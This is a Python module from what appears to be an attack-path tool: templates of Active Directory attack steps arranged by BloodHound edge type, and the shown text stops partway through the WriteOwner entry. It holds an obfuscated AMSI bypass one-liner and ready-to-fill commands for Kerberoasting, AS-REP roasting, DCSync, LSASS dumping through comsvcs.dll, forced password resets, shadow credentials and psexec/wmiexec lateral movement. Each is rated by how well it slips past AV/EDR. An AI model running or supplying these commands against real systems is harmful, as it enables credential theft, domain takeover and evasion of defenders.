"""
OPSEC-Aware Attack Step Templates
Location: backend/routers/attack_paths/constants/opsec_templates.py

These templates provide attack steps with safe vs risky options for different edge types.
The OPSEC level indicates detection likelihood:
- safe: Uses native Windows tools, blends with normal activity
- risky: Uses offensive tools that are flagged by AV/EDR
"""

from typing import Dict, List

# ===========================================
# AMSI BYPASS (Required before running PowerShell tools)
# ===========================================
# This obfuscated bypass uses string concatenation and format operators
# to evade signature detection. Sets amsiInitFailed to true.
AMSI_BYPASS_ONELINER = """S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )"""


# Edge types that have curated templates with REAL attack commands
# Used as fallback when LLM parsing fails
TEMPLATED_EDGE_TYPES = {
    'MemberOf', 'HasSPNConfigured', 'Kerberoastable', 'ASREPRoastable',
    'DCSync', 'GenericAll', 'GenericWrite', 'WriteDacl', 'WriteOwner',
    'AdminTo', 'ForceChangePassword', 'AddKeyCredentialLink',
    'AllExtendedRights', 'AddMember', 'AllowedToDelegate',
    'AllowedToAct', 'ReadLAPSPassword', 'ReadGMSAPassword',
    # ADCS edge types
    'ADCSESC1', 'ADCSESC4', 'ADCSESC8', 'Enroll', 'ManageCA', 'ManageCertificates',
}


def has_opsec_template(edge_type: str) -> bool:
    """Check if we have a curated template for this edge type."""
    return edge_type in TEMPLATED_EDGE_TYPES


def extract_dc_hostname(domain: str, computers: List[str] = None, spns: List[str] = None,
                        all_names: List[str] = None) -> str:
    """
    Extract the actual DC hostname from BloodHound data.

    Searches multiple sources for DC hostname patterns:
    - Computer names (e.g., "DC01.SEQUEL.HTB")
    - SPNs (e.g., "ldap/DC01.sequel.htb", "SQLSERVER2005SQLBROWSERUSER$DC01")
    - All names (group names, user names that may contain DC references)

    Args:
        domain: Target domain (e.g., 'SEQUEL.HTB')
        computers: List of computer names from query results
        spns: List of SPNs from query results
        all_names: List of all names (users, groups, etc.) that may contain DC hostname

    Returns:
        Best guess for DC hostname (e.g., 'DC01.SEQUEL.HTB')
    """
    import re

    # Never use placeholder domains - if no domain, can't construct FQDN
    if not domain:
        return None
    domain_upper = domain.upper()

    # Common DC naming patterns - order matters (prefer specific patterns first)
    dc_patterns = [
        r'DC0*[1-9]',  # DC01, DC1, DC02, etc.
        r'DC',         # Just DC
        r'PDC',        # Primary DC
        r'BDC',        # Backup DC
        r'ADC',        # Additional DC
    ]

    # Regex to find DC hostname patterns
    dc_regex = re.compile(r'\b(DC0*[1-9]|PDC|BDC|ADC)\b', re.IGNORECASE)

    # Priority 1: Check computers list for DC-like names
    if computers:
        for comp in computers:
            comp_clean = comp.upper().split('@')[0]
            # Extract just hostname without domain
            hostname = comp_clean.split('.')[0] if '.' in comp_clean else comp_clean
            match = dc_regex.match(hostname)
            if match:
                return f"{hostname}.{domain_upper}"

    # Priority 2: Check SPNs for DC references
    if spns:
        for spn in spns:
            spn_upper = spn.upper()
            # Pattern 1: service/hostname (e.g., "ldap/DC01.sequel.htb")
            if '/' in spn_upper:
                hostname_part = spn_upper.split('/')[1].split(':')[0]
                hostname = hostname_part.split('.')[0] if '.' in hostname_part else hostname_part
                match = dc_regex.match(hostname)
                if match:
                    if '.' in hostname_part and domain_upper in hostname_part:
                        return hostname_part  # Already FQDN
                    return f"{hostname}.{domain_upper}"

            # Pattern 2: Service account with DC suffix (e.g., "SQLSERVER2005SQLBROWSERUSER$DC01")
            dc_suffix_match = re.search(r'\$(DC0*[1-9]|PDC|BDC)$', spn_upper)
            if dc_suffix_match:
                dc_name = dc_suffix_match.group(1)
                return f"{dc_name}.{domain_upper}"

    # Priority 3: Check all names for DC patterns
    if all_names:
        for name in all_names:
            name_upper = name.upper()
            # Look for DC patterns in names (e.g., groups containing DC hostname)
            dc_suffix_match = re.search(r'\$(DC0*[1-9]|PDC|BDC)', name_upper)
            if dc_suffix_match:
                dc_name = dc_suffix_match.group(1)
                return f"{dc_name}.{domain_upper}"

            # Check if name starts with DC pattern (computer name)
            match = dc_regex.match(name_upper.split('@')[0].split('.')[0])
            if match:
                hostname = name_upper.split('@')[0].split('.')[0]
                return f"{hostname}.{domain_upper}"

    # Fallback: Use DC01.domain format (most common naming convention)
    return f"DC01.{domain_upper}"


def get_opsec_attack_steps(edge_type: str, domain: str, source: str, target: str,
                           dc_hostname: str = None, computers: List[str] = None,
                           spns: List[str] = None) -> List[Dict]:
    """
    Get OPSEC-aware attack steps for common edge types.

    Args:
        edge_type: The BloodHound edge type
        domain: Target domain
        source: Source principal
        target: Target object
        dc_hostname: Optional explicit DC hostname (e.g., 'DC01.SEQUEL.HTB')
        computers: Optional list of computer names for DC extraction
        spns: Optional list of SPNs for DC extraction

    Returns:
        List of attack step dictionaries with opsec_options
    """
    # Never use placeholder domains - keep empty if not available
    domain = domain or ''
    source = source or '<user>'
    target = target or '<target>'

    # Extract DC hostname from data or use provided/fallback
    if dc_hostname:
        dc_hostname = dc_hostname
    else:
        dc_hostname = extract_dc_hostname(domain, computers, spns)

    # Map related edge types to their canonical template
    edge_aliases = {
        'GetChanges': 'DCSync',
        'GetChangesAll': 'DCSync',
        'GetChangesInFilteredSet': 'DCSync',
    }
    canonical_edge = edge_aliases.get(edge_type, edge_type)

    templates = _get_opsec_templates(domain, source, target, dc_hostname)
    default = _get_default_template(edge_type)

    return templates.get(edge_type, default)


def _get_opsec_templates(domain: str, source: str, target: str, dc_hostname: str) -> Dict[str, List[Dict]]:
    """Build OPSEC templates with substituted values."""
    return {
        'MemberOf': [
            {
                'step_number': 1,
                'title': 'Enumerate Privileged Group Members',
                'category': 'Discovery',
                'description': f'Identify all members of privileged groups including **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Get-ADGroupMember -Identity '{target}' -Recursive | Select-Object Name, objectClass",
                        'explanation': 'Uses the built-in **Active Directory PowerShell module**. This is standard administrative activity and blends with normal AD operations.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"Get-DomainGroupMember -Identity '{target}' -Recurse",
                        'explanation': 'PowerView is **flagged by most AV/EDR solutions** including Windows Defender. **Run AMSI bypass first** before loading PowerView. Use only in lab environments or with explicit authorization.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Target Account for Credential Theft',
                'category': 'Credential Access',
                'description': 'Check if privileged accounts have SPNs configured for Kerberoasting.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Get-ADUser -Filter {{ServicePrincipalName -ne \"$null\"}} -Properties ServicePrincipalName,MemberOf | Where-Object {{$_.MemberOf -match '{target}'}}",
                        'explanation': 'Queries AD for users with SPNs who are members of privileged groups. Uses **built-in cmdlets** that appear as normal admin activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket',
                        'command': f"GetUserSPNs.py {domain}/{source} -dc-ip {dc_hostname}",
                        'explanation': 'Network-based tool that queries LDAP from an external machine. **May trigger network-based detection** as it generates external LDAP traffic.'
                    }
                ]
            },
        ],
        'HasSPNConfigured': [
            {
                'step_number': 1,
                'title': 'Enumerate Kerberoastable Accounts',
                'category': 'Discovery',
                'description': f'Lists all accounts with Service Principal Names (SPNs). The **{source or target}** account would appear as a target due to its SPN registration.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': 'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName',
                        'explanation': 'Uses the built-in **Active Directory PowerShell module** to query all user accounts with SPNs. Blends with normal administrative activity and won\'t trigger security alerts.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': 'Get-DomainUser -SPN',
                        'explanation': 'PowerView\'s `Get-DomainUser -SPN` uses LDAP queries. **PowerView is flagged by most AV/EDR solutions**. **Run AMSI bypass first** before loading PowerView.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Request Service Ticket',
                'category': 'Credential Access',
                'description': f'Request a Kerberos service ticket for **{source or target}**. The ticket is encrypted with the service account\'s password hash.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f'Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{source or target}"',
                        'explanation': 'Uses .NET\'s **System.IdentityModel** namespace to request a Kerberos ticket. This appears as normal Kerberos traffic (TGS-REQ) and doesn\'t load any external tools.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Rubeus',
                        'command': f'Rubeus.exe kerberoast /user:{source or target} /outfile:hashes.txt',
                        'explanation': 'Rubeus is a C# Kerberos manipulation toolkit. **Rubeus is detected by most EDR solutions**. If running via PowerShell, **run AMSI bypass first**. Binary should be obfuscated.'
                    }
                ]
            },
            {
                'step_number': 3,
                'title': 'Crack Service Ticket Offline',
                'category': 'Credential Access',
                'description': 'Export the service ticket and crack it offline to recover the plaintext password.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Hashcat (Offline)',
                        'command': 'hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --rules-file=rules/best64.rule',
                        'explanation': '**Hashcat** mode 13100 cracks Kerberos TGS-REP hashes. This runs **entirely offline on the attacker\'s machine** — no network traffic to the target. GPU-accelerated cracking can test billions of hashes per second.'
                    },
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'John the Ripper (Offline)',
                        'command': 'john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
                        'explanation': '**John the Ripper** with krb5tgs format. Runs completely offline. CPU-based alternative when GPU is unavailable.'
                    }
                ]
            },
        ],
        # Alias for Kerberoastable - same attack pattern
        'Kerberoastable': [
            {
                'step_number': 1,
                'title': 'Identify Kerberoastable Service Account',
                'category': 'Discovery',
                'description': f'The service account **{target}** has a Service Principal Name (SPN) configured, making it vulnerable to Kerberoasting. Verify the account details and SPN.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Get-ADUser -Identity '{target.split('@')[0] if target else 'svc_target'}' -Properties ServicePrincipalName,MemberOf | Select-Object Name,ServicePrincipalName,MemberOf",
                        'explanation': 'Uses the built-in **Active Directory PowerShell module** to query the target account\'s SPN. Blends with normal administrative activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket GetUserSPNs',
                        'command': f"GetUserSPNs.py {domain}/{source.split('@')[0] if source else 'user'}:'password' -dc-ip {dc_hostname} -request-user {target.split('@')[0] if target else 'svc_target'}",
                        'explanation': 'Impacket\'s GetUserSPNs queries from an external Linux machine. **Generates network LDAP traffic** which may be logged.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Request Service Ticket (TGS)',
                'category': 'Credential Access',
                'description': f'Request a Kerberos service ticket for **{target}**. The TGS is encrypted with the service account\'s NTLM hash, enabling offline cracking.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native .NET Kerberos',
                        'command': f"Add-Type -AssemblyName System.IdentityModel\n$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '{target}'\n$ticket = $token.GetRequest()\n[System.IO.File]::WriteAllBytes('ticket.kirbi', $ticket)",
                        'explanation': 'Uses .NET\'s **System.IdentityModel** namespace to request a TGS. This appears as normal Kerberos traffic (TGS-REQ) and doesn\'t load any external tools. Event 4769 is logged but blends with normal activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Rubeus Kerberoast',
                        'command': f"Rubeus.exe kerberoast /user:{target.split('@')[0] if target else 'svc_target'} /outfile:hashes.txt /format:hashcat",
                        'explanation': 'Rubeus is a C# Kerberos toolkit. **Rubeus is detected by most EDR solutions**. If running via PowerShell, **run AMSI bypass first**. Use /nowrap for easier hash extraction.'
                    }
                ]
            },
            {
                'step_number': 3,
                'title': 'Crack Service Ticket Offline',
                'category': 'Credential Access',
                'description': f'Crack the TGS hash offline to recover **{target}**\'s plaintext password. This is entirely offline - no network traffic to the target.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Hashcat (GPU Cracking)',
                        'command': f"# On attacker machine (Kali/Linux)\nhashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --rules-file=/usr/share/hashcat/rules/best64.rule\n\n# For etype 23 (RC4): -m 13100\n# For etype 17/18 (AES): -m 19700",
                        'explanation': '**Hashcat** mode 13100 cracks Kerberos TGS-REP (RC4) hashes. Runs **entirely offline on the attacker\'s machine**. GPU-accelerated cracking tests billions of hashes per second.'
                    },
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'John the Ripper',
                        'command': f"# On attacker machine\njohn --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Show cracked password\njohn --show hashes.txt",
                        'explanation': '**John the Ripper** with krb5tgs format. CPU-based alternative when GPU is unavailable. Still runs completely offline.'
                    }
                ]
            },
            {
                'step_number': 4,
                'title': 'Authenticate with Recovered Credentials',
                'category': 'Lateral Movement',
                'description': f'Use the cracked password to authenticate as **{target}** and access systems where this service account has privileges.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'PowerShell Credential',
                        'command': f"$cred = New-Object System.Management.Automation.PSCredential('{target}', (ConvertTo-SecureString 'crackedpassword' -AsPlainText -Force))\nInvoke-Command -ComputerName TARGET_SERVER -Credential $cred -ScriptBlock {{ whoami }}",
                        'explanation': 'Uses native PowerShell remoting with the cracked credentials. Appears as normal WinRM traffic. Event 4624 type 3 logged on target.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket psexec/wmiexec',
                        'command': f"# From Kali\nwmiexec.py {domain}/{target.split('@')[0] if target else 'svc_target'}:'crackedpassword'@TARGET_SERVER\n\n# Or for shell access\npsexec.py {domain}/{target.split('@')[0] if target else 'svc_target'}:'crackedpassword'@TARGET_SERVER",
                        'explanation': 'Impacket tools provide remote execution. **wmiexec** is stealthier (no service creation). **psexec** creates a service (Event 4697).'
                    }
                ]
            },
        ],
        # AS-REP Roasting - No credentials required!
        'ASREPRoastable': [
            {
                'step_number': 1,
                'title': 'Identify AS-REP Roastable Accounts',
                'category': 'Discovery',
                'description': f'The account **{target}** has Kerberos pre-authentication disabled, allowing AS-REP Roasting without any credentials.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name,Enabled,DoesNotRequirePreAuth",
                        'explanation': 'Uses the built-in **Active Directory PowerShell module** to find accounts without pre-auth. Blends with normal administrative activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket GetNPUsers',
                        'command': f"GetNPUsers.py {domain}/ -usersfile users.txt -dc-ip {dc_hostname} -no-pass -format hashcat",
                        'explanation': 'Impacket\'s GetNPUsers queries from an external Linux machine. **No credentials required** - can be run anonymously.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Request AS-REP Hash',
                'category': 'Credential Access',
                'description': f'Request an AS-REP for **{target}** without providing credentials. The response is encrypted with the user\'s password hash.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Impacket GetNPUsers (Targeted)',
                        'command': f"GetNPUsers.py {domain}/{target.split('@')[0] if target else 'target_user'} -dc-ip {dc_hostname} -no-pass -format hashcat -outputfile asrep_hashes.txt",
                        'explanation': 'Targeted AS-REP request for specific user. **No credentials needed** - generates Kerberos AS-REQ traffic only.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Rubeus asreproast',
                        'command': f"Rubeus.exe asreproast /user:{target.split('@')[0] if target else 'target_user'} /format:hashcat /outfile:asrep_hashes.txt",
                        'explanation': 'Rubeus AS-REP Roasting on Windows. **Rubeus is detected by most EDR solutions**. Run AMSI bypass first.'
                    }
                ]
            },
            {
                'step_number': 3,
                'title': 'Crack AS-REP Hash Offline',
                'category': 'Credential Access',
                'description': f'Crack the AS-REP hash offline to recover **{target}**\'s plaintext password.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Hashcat (GPU Cracking)',
                        'command': f"# On attacker machine (Kali/Linux)\nhashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --rules-file=/usr/share/hashcat/rules/best64.rule",
                        'explanation': '**Hashcat** mode 18200 cracks AS-REP hashes. Runs **entirely offline** - no network traffic to the target.'
                    },
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'John the Ripper',
                        'command': f"john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt",
                        'explanation': '**John the Ripper** with krb5asrep format. CPU-based alternative when GPU is unavailable.'
                    }
                ]
            },
            {
                'step_number': 4,
                'title': 'Authenticate with Recovered Credentials',
                'category': 'Lateral Movement',
                'description': f'Use the cracked password to authenticate as **{target}** and access resources.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'PowerShell Credential',
                        'command': f"$cred = New-Object System.Management.Automation.PSCredential('{target}', (ConvertTo-SecureString 'crackedpassword' -AsPlainText -Force))\nInvoke-Command -ComputerName TARGET_SERVER -Credential $cred -ScriptBlock {{ whoami }}",
                        'explanation': 'Uses native PowerShell remoting with the cracked credentials. Appears as normal WinRM traffic.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket wmiexec',
                        'command': f"wmiexec.py {domain}/{target.split('@')[0] if target else 'target_user'}:'crackedpassword'@TARGET_SERVER",
                        'explanation': 'Impacket wmiexec for remote execution. Stealthier than psexec (no service creation).'
                    }
                ]
            },
        ],
        'DCSync': [
            {
                'step_number': 1,
                'title': 'Verify DCSync Rights',
                'category': 'Discovery',
                'description': f'Verify that **{source}** has replication rights on the domain.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"(Get-Acl 'AD:DC={domain.replace('.', ',DC=')}').Access | Where-Object {{$_.IdentityReference -like '*{source.split('@')[0]}*' -and $_.ObjectType -match 'replication'}}",
                        'explanation': 'Uses **built-in PowerShell** to query the domain ACL. Standard administrative activity that won\'t trigger alerts.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"Get-ObjectAcl -DistinguishedName 'DC={domain.replace('.', ',DC=')}' -ResolveGUIDs | ? {{$_.ObjectType -match 'replication'}}",
                        'explanation': 'PowerView ACL enumeration. **Flagged by security tools** - use native PowerShell alternative when possible.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Execute DCSync Attack',
                'category': 'Credential Access',
                'description': 'Replicate the krbtgt hash from the domain controller. This hash enables Golden Ticket creation.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Mimikatz',
                        'command': f'mimikatz "lsadump::dcsync /user:{domain}\\krbtgt"',
                        'explanation': '**Mimikatz** is the most common DCSync tool but is **heavily signatured by all security tools**. **Run AMSI bypass first** if using Invoke-Mimikatz. Consider using secretsdump.py from a Linux attack machine.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket',
                        'command': f"secretsdump.py {domain}/{source}@{dc_hostname} -just-dc-user krbtgt",
                        'explanation': 'Impacket\'s secretsdump performs DCSync over the network. **Network-based detection may trigger** but avoids running tools on domain-joined machines.'
                    }
                ]
            },
        ],
        'GenericAll': [
            {
                'step_number': 1,
                'title': 'Verify GenericAll Permission',
                'category': 'Discovery',
                'description': f'Confirm **{source}** has GenericAll rights over **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"(Get-Acl 'AD:{target}').Access | Where-Object {{$_.IdentityReference -like '*{source.split('@')[0]}*' -and $_.ActiveDirectoryRights -eq 'GenericAll'}}",
                        'explanation': 'Uses **built-in Get-Acl** cmdlet to query object permissions. Standard AD administration activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"Get-ObjectAcl -Identity '{target}' | ? {{$_.ActiveDirectoryRights -eq 'GenericAll'}}",
                        'explanation': 'PowerView ACL enumeration is **detected by security tools**. Prefer native PowerShell for ACL queries.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Reset Target Password',
                'category': 'Privilege Escalation',
                'description': f'Use GenericAll to reset **{target}** password without knowing the current password.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Set-ADAccountPassword -Identity '{target}' -Reset -NewPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)",
                        'explanation': 'Uses **built-in AD cmdlet** to reset password. Will generate Event ID 4724 (password reset) which may be monitored, but the action itself uses legitimate tools.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"Set-DomainUserPassword -Identity '{target}' -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)",
                        'explanation': 'PowerView\'s password reset function. **Flagged by AV/EDR** - use native PowerShell alternative.'
                    }
                ]
            },
        ],
        'GenericWrite': [
            {
                'step_number': 1,
                'title': 'Verify GenericWrite Permission',
                'category': 'Discovery',
                'description': f'Confirm **{source}** has GenericWrite rights over **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"(Get-Acl 'AD:{target}').Access | Where-Object {{$_.IdentityReference -like '*{source.split('@')[0]}*' -and $_.ActiveDirectoryRights -match 'Write'}}",
                        'explanation': 'Uses **built-in Get-Acl** cmdlet. Standard administrative activity.'
                    },
                ]
            },
            {
                'step_number': 2,
                'title': 'Add SPN for Kerberoasting',
                'category': 'Credential Access',
                'description': f'Add a fake SPN to **{target}** to enable Kerberoasting.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Set-ADUser -Identity '{target}' -ServicePrincipalNames @{{Add='fake/spn'}}",
                        'explanation': 'Uses built-in AD cmdlet to modify SPN. Event 5136 will be logged but uses legitimate tools.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"Set-DomainObject -Identity '{target}' -Set @{{serviceprincipalname='fake/spn'}}",
                        'explanation': 'PowerView is **detected by security tools**.'
                    }
                ]
            },
        ],
        'WriteDacl': [
            {
                'step_number': 1,
                'title': 'Verify WriteDacl Permission',
                'category': 'Discovery',
                'description': f'Confirm **{source}** has WriteDacl rights over **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"(Get-Acl 'AD:{target}').Access | Where-Object {{$_.IdentityReference -like '*{source.split('@')[0]}*' -and $_.ActiveDirectoryRights -match 'WriteDacl'}}",
                        'explanation': 'Uses built-in Get-Acl cmdlet. Standard AD administration activity.'
                    },
                ]
            },
            {
                'step_number': 2,
                'title': 'Grant Self Full Control',
                'category': 'Privilege Escalation',
                'description': f'Modify the DACL to grant **{source}** GenericAll rights.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"Add-DomainObjectAcl -TargetIdentity '{target}' -PrincipalIdentity '{source}' -Rights All",
                        'explanation': 'Grants GenericAll to yourself. Event 5136 and 4670 will be logged. **PowerView is detected by AV/EDR**.'
                    },
                ]
            },
        ],
        'AdminTo': [
            {
                'step_number': 1,
                'title': 'Verify Local Admin Access',
                'category': 'Discovery',
                'description': f'Confirm **{source}** has local admin rights on **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native Tools',
                        'command': f"dir \\\\{target}\\c$ 2>nul && echo Admin Access Confirmed",
                        'explanation': 'Simple admin share check using native Windows commands.'
                    },
                ]
            },
            {
                'step_number': 2,
                'title': 'Establish Remote Session',
                'category': 'Lateral Movement',
                'description': f'Use local admin rights to access **{target}** remotely.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'WinRM',
                        'command': f"Enter-PSSession -ComputerName {target}",
                        'explanation': 'Uses built-in PowerShell remoting. Normal administrative activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket',
                        'command': f"psexec.py {domain}/{source}@{target}",
                        'explanation': 'PsExec creates a service (Event 4697). **Network-based attack may trigger detection**.'
                    }
                ]
            },
            {
                'step_number': 3,
                'title': 'Dump Credentials',
                'category': 'Credential Access',
                'description': 'Extract credentials from memory if privileged users are logged in.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Mimikatz',
                        'command': 'sekurlsa::logonpasswords',
                        'explanation': '**Mimikatz is heavily signatured**. **Run AMSI bypass first** if using Invoke-Mimikatz in PowerShell. Consider comsvcs.dll minidump or Nanodump for OPSEC.'
                    },
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'comsvcs.dll (LOLBAS)',
                        'command': 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\dump.dmp full',
                        'explanation': 'Uses legitimate Windows DLL to create minidump. **Living off the land** technique.'
                    }
                ]
            },
        ],
        'ForceChangePassword': [
            {
                'step_number': 1,
                'title': 'Reset Target Password',
                'category': 'Privilege Escalation',
                'description': f'Reset **{target}** password without knowing the current password.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Set-ADAccountPassword -Identity '{target}' -Reset -NewPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)",
                        'explanation': 'Uses built-in AD cmdlet. Event ID 4724 logged but uses legitimate tools.'
                    },
                ]
            },
        ],
        'AddKeyCredentialLink': [
            {
                'step_number': 1,
                'title': 'Add Shadow Credentials',
                'category': 'Persistence',
                'description': f'Add key credentials to **{target}** for certificate-based authentication.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Whisker',
                        'command': f"Whisker.exe add /target:{target} /domain:{domain} /dc:{dc_hostname}",
                        'explanation': 'Whisker modifies msDS-KeyCredentialLink. **Event 5136 logged** - attribute modification.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'pyWhisker',
                        'command': f"python3 pywhisker.py -d '{domain}' -u '{source}' -p 'password' --target '{target}' --action add",
                        'explanation': 'Python implementation runs from attack machine. Network-based but avoids on-target execution.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Authenticate with Certificate',
                'category': 'Credential Access',
                'description': 'Use the generated certificate to obtain a TGT.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Rubeus',
                        'command': f"Rubeus.exe asktgt /user:{target} /certificate:cert.pfx /password:password /ptt",
                        'explanation': 'Uses PKINIT pre-authentication. Event 4768 with pre-auth type 16 (certificate).'
                    },
                ]
            },
        ],
        # =====================================================================
        # AllExtendedRights - Can reset passwords or read LAPS
        # =====================================================================
        'AllExtendedRights': [
            {
                'step_number': 1,
                'title': 'Reset Target Password',
                'category': 'Privilege Escalation',
                'description': f'Use AllExtendedRights to reset **{target}** password and take over the account.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Set-ADAccountPassword -Identity '{target.split('@')[0]}' -Reset -NewPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)\n\n# Verify the password was changed\nGet-ADUser -Identity '{target.split('@')[0]}' -Properties PasswordLastSet | Select-Object Name, PasswordLastSet",
                        'explanation': 'Uses built-in AD cmdlet. **Event ID 4724** (password reset) will be logged.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket',
                        'command': f"python3 changepasswd.py {domain}/{source.split('@')[0]}:'CurrentPass'@{dc_hostname} -newpass 'P@ssw0rd123!' -altuser {target.split('@')[0]}",
                        'explanation': 'Performs password change over the network from Linux attack machine.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Authenticate as Target',
                'category': 'Lateral Movement',
                'description': f'Use the new credentials to authenticate as **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"$cred = New-Object System.Management.Automation.PSCredential('{target}', (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force))\nEnter-PSSession -ComputerName {dc_hostname} -Credential $cred",
                        'explanation': 'Uses native PowerShell remoting. Blends with legitimate admin activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket',
                        'command': f"python3 psexec.py {domain}/{target.split('@')[0]}:'P@ssw0rd123!'@{dc_hostname}",
                        'explanation': 'Creates a service on target. **Event 7045** logged for service creation.'
                    }
                ]
            },
        ],
        # =====================================================================
        # WriteOwner - Take ownership then grant yourself full control
        # =====================================================================
        'WriteOwner': [
            {
                'step_number': 1,
